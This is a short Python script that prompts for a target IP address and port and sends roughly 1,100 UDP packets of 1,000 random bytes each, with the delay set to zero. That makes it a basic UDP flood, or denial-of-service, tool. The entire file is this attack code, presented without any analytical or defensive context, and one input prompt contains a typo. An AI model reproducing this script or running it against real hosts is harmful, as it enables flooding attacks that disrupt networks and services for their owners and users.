import socket
import random 
import time
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
ip=input('ENTER IP :\n')
port= int(input("EBTER PORT :\n"))
sleep=0
s.connect((ip,port))
for i in range(1,100+1000):
    s.send(random._urandom(1000,))
    print(f"send:{i}",end="\r")
    time.sleep(sleep)

